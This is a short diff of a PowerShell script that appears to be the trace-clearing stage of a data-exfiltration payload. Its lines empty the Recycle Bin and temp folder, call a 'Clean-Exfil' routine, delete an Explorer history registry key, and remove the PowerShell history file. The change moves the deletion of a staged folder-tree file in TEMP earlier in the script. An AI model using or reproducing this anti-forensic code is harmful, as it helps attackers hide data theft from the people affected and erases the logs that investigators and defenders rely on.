@@ -80,6 +80,8 @@ Clear-RecycleBin -Force -ErrorAction SilentlyContinue
 
 ############################################################################################################################################################
 
+RI $env:TEMP/--folder-tree.txt
+
 if (-not ([string]::IsNullOrEmpty($ce))){Clean-Exfil}
 
 # empty temp folder
@@ -90,5 +92,3 @@ reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\
 
 # Delete powershell history
 Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue
-
-RI $env:TEMP/--folder-tree.txt
